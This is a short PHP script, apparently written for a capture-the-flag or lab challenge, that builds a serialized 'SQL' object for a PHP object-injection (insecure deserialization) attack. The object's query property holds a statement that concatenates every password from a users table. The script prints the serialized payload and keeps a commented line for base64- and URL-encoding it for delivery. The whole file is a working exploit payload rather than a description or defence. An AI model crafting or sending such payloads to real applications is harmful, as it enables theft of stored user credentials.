<?php

class SQL
{
    public $query;
    public $conn;

    function __construct()
    {
        $this->query = "SELECT GROUP_CONCAT(password) as username from users;";
        $this->conn = NULL;
    }
}

$inst = new SQL();

echo(serialize($inst));

//echo urlencode(base64_encode(serialize($inst)));

?>